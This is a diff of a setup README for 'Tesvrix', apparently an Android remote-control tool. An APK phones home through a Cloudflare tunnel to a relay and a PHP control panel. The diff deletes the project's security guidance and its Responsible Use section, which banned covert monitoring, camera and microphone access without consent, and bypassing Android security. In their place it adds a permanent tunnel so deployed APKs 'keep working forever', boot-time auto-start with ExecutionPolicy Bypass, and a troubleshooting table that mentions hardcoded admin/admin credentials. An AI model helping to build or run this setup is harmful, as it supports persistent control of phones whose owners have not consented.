+| Login page opens but black screen after login | You logged into the "light" demo page (index.html with hardcoded admin/admin), not the real panel | Open the cloudflare URL for the *panel* (port 8080), not the relay; if you're on demo login, use the real creds |
+| Chrome/panel says 403 / Access Denied | `x-access-token` mismatch | compare every token in Section 5 checklist; restart relay after changing env vars |
+| 403 / Access Denied in panel | the panel's `$web_token` differs from the relay's `WEB_ACCESS_TOKEN` | make them identical, restart relay |
+| Device never phones home | URL in APK (getC()[0]) is not your relay's tunnel URL (typo, trailing slash) | rebuild after fix |
+| Health check fails on public URL | Tunnel window closed; name changed | start `cloudflared` again, use new URL, rebuild APK |
+| Build errors about missing platform | SDK not installed | run sdkmanager commands in 6.1 |
+| Build errors "sdk.dir" | local.properties points somewhere wrong | fix 6.2 to `C\:\\Android\\Sdk` |
+| `npm install` fails / node errors | internet / node version | Node 18+; re-run |
+| Disk "out of space" during build | SDK + Gradle cache need few GB | free space; Gradle stores cache in `~`.gradle (can be 1-2 GB) |
 
 ---
 
-Port 8080 already in use
-
-Run:
-
-netstat -ano | findstr :8080
-
-Alternatively:
-
-php -S 127.0.0.1:8081
-
-Remember to update the corresponding application configuration.
-
----
-
-Supabase connection fails
-
-Check:
-
-Supabase URL
-Server-side credentials
-Environment variables
-Network connectivity
-Database permissions
-RLS policies
-
-Do not put a privileged key into the APK to solve a server configuration problem.
-
----
-
-Android build fails
-
-Run:
-
-java -version
-
-Then:
-
-.\gradlew.bat --version
-
-Then:
-
-.\gradlew.bat clean
-
-Try again:
-
-.\gradlew.bat assembleDebug
-
-Check:
-
-JDK
-Android SDK
-Build Tools
-Gradle wrapper
-Android Gradle Plugin
-compileSdk
-
----
-
-"sdk.dir" error
-
-Create:
-
-C:\Tesvrix\Android\local.properties
-
-Example:
-
-sdk.dir=C:\\Users\\YOUR_USERNAME\\AppData\\Local\\Android\\Sdk
-
-Do not commit this file.
-
----
-
-ADB cannot find the phone
-
-Run:
-
-adb devices
-
-Then:
-
-1. Enable Developer Options
-2. Enable USB Debugging
-3. Unlock the phone
-4. Reconnect USB
-5. Accept the debugging authorization prompt
-6. Run adb devices again
-
----
-
-26. Production Security
-
-The PHP built-in server is intended for development.
-
-Do not treat:
-
-php -S 127.0.0.1:8080
-
-as a production hosting solution.
-
-For production, use an appropriate web server and proper deployment architecture.
-
-Minimum Requirements
-
-HTTPS / TLS
-Strong authentication
-Server-side authorization
-Secure sessions
-CSRF protection
-Input validation
-Output encoding
-Rate limiting
-Database access controls
-Row Level Security
-Secure cookies
-Secret management
-Logging
-Backups
-Dependency updates
-
----
-
-🔑 Secrets
-
-Never commit:
-
-.env
-local.properties
-*.jks
-*.keystore
-*.pem
-private keys
-database passwords
-service-role keys
-production API keys
-authentication secrets
-
-If a secret is accidentally pushed to GitHub:
-
-1. Revoke it immediately
-2. Generate a new secret
-3. Replace it locally
-4. Remove the old secret from repository history
-5. Check logs for unauthorized use
-
-Simply deleting a secret from the latest commit is not enough.
-
----
-
-27. GitHub Publishing Checklist
-
-Before pushing:
-
-git status
-
-Review all files.
-
-Search for sensitive values such as:
-
-password
-secret
-token
-apikey
-service_role
-private_key
-
-Check ignored files:
-
-git status --ignored
-
-Then:
-
-git add .
-git commit -m "Prepare development release"
-git push
-
----
-
-28. Complete Setup Checklist
-
-Windows
-
-[ ] Windows ready
-[ ] Git installed
-[ ] Node.js installed
-[ ] npm working
-[ ] PHP installed
-[ ] JDK 17 installed
-[ ] Android Studio installed
-[ ] Android SDK installed
-[ ] Platform Tools installed
-[ ] ADB working
-
-Project
-
-[ ] Repository cloned
-[ ] Folder structure verified
-[ ] .gitignore configured
-[ ] Environment configuration created
-
-Supabase
-
-[ ] Project created
-[ ] Database created
-[ ] SQL imported
-[ ] Tables verified
-[ ] Authentication configured
-[ ] Authorization configured
-[ ] RLS reviewed
-
-Node.js
-
-[ ] npm install completed
-[ ] Environment variables configured
-[ ] Backend starts
-[ ] Health check works
-[ ] Database connection works
-
-PHP
-
-[ ] config.php configured
-[ ] PHP server starts
-[ ] Dashboard opens
-[ ] Backend communication works
-
-Android
-
-[ ] Android project opens
-[ ] Gradle wrapper works
-[ ] SDK detected
-[ ] Debug APK builds
-[ ] ADB detects test device
-[ ] APK installs
-
-Remote Development
-
-[ ] Local system tested first
-[ ] Authentication enabled
-[ ] Authorization enabled
-[ ] HTTPS enabled
-[ ] Cloudflare configured
-[ ] No secrets exposed
-
----
-
-29. Quick Start
-
-After completing the initial configuration, use three terminals.
-
-Terminal 1 — Node.js
-
-cd C:\Tesvrix\Server
-npm install
-npm start
-
----
-
-Terminal 2 — PHP
-
-cd C:\Tesvrix\web
-php -S 127.0.0.1:8080
-
----
-
-Terminal 3 — Android
-
-cd C:\Tesvrix\Android
-.\gradlew.bat clean
-.\gradlew.bat assembleDebug
-
----
-
-🌐 Open the Web Panel
-
-http://127.0.0.1:8080
-
----
-
-📦 Android APK
-
-After a successful build:
-
-C:\Tesvrix\Android\app\build\outputs\apk\debug\app-debug.apk
-
-Install on your authorized test device:
-
-adb install -r .\app\build\outputs\apk\debug\app-debug.apk
-
----
-
-🧪 Recommended Development Order
-
-Always follow this order:
-
-1. Install Windows dependencies
-             ↓
-2. Configure Git
-             ↓
-3. Configure Node.js
-             ↓
-4. Configure PHP
-             ↓
-5. Configure JDK
-             ↓
-6. Configure Android SDK
-             ↓
-7. Clone Tesvrix
-             ↓
-8. Configure .gitignore
-             ↓
-9. Create Supabase project
-             ↓
-10. Import database schema
-             ↓
-11. Configure server environment
-             ↓
-12. Start Node.js backend
-             ↓
-13. Start PHP panel
-             ↓
-14. Test everything locally
-             ↓
-15. Prepare Android test client
-             ↓
-16. Build debug APK
-             ↓
-17. Test using authorized device/emulator
-             ↓
-18. Add remote tunnel only if required
-             ↓
-19. Secure the deployment
-             ↓
-20. Publish only sanitized source
-
----
-
-🛡️ Responsible Use
-
-Tesvrix should only be used in environments where you have explicit authorization.
-
-Use:
-
-Your own PC
-Your own database
-Your own test devices
-Android Emulator
-Authorized test accounts
-Authorized networks
-
-Do not use the project to:
-
-✗ secretly monitor people
-✗ secretly collect private information
-✗ access another person's messages
-✗ access cameras or microphones without consent
-✗ track unauthorized devices
-✗ bypass Android security
-✗ hide unauthorized device activity
-✗ deploy unauthorized remote-control functionality
-
----
-
-⭐ Development Principles
-
-SECURE BY DEFAULT
-       +
-EXPLICIT CONSENT
-       +
-LEAST PRIVILEGE
-       +
-SERVER-SIDE AUTHORIZATION
-       +
-NO HARDCODED SECRETS
-       +
-LOCAL-FIRST TESTING
-       +
-CLEAR DOCUMENTATION
-
----
-
-📄 License
-
-Add the project's actual license here.
-
-Example:
-
-Copyright © 2026 Tesvrix
-
-See LICENSE for complete license terms.
-
----
-
-🚀 Tesvrix
-
-Local development.
-Controlled testing.
-Secure architecture.
-Explicit authorization.
+## Making it permanent (auto-start, stable URL)
+
+Quick tunnels don't survive a reboot or a cloudflared restart. For permanent, long-term hosting on your home PC:
+
+1. **Named tunnel (fixed URL).** In cloudflared:
+   ```powershell
+   .\cloudflared.exe tunnel login
+   .\cloudflared.exe tunnel create mytesvrix
+   .\cloudflared.exe tunnel route dns mytesvrix mytesvrix.yourdomain.com
+   .\cloudflared.exe tunnel run --url http://localhost:10000 mytesvrix
+   ```
+   Then the URL never changes → the APK keeps working forever. You need a domain connected to Cloudflare for the nice URL.
+
+2. **Auto-start everything on boot** (startup folder):
+   - Create `start-relay.cmd`:
+     ```
+     @echo off
+     cd C:\tesvrix\relay
+     powershell -ExecutionPolicy Bypass -File .\run-relay.ps1
+     ```
+   - Create `start-php.cmd`:
+     ```
+     cd C:\tesvrix\panel
+     php -S 127.0.0.1:8080
+     ```
+   - Create `start-tunnels.cmd`: run both named tunnel commands (one per service, each in its own window).
+   - Place all three .cmd shortcuts into `shell:startup`.
+
+   Every reboot they all start in separate windows → whole system on
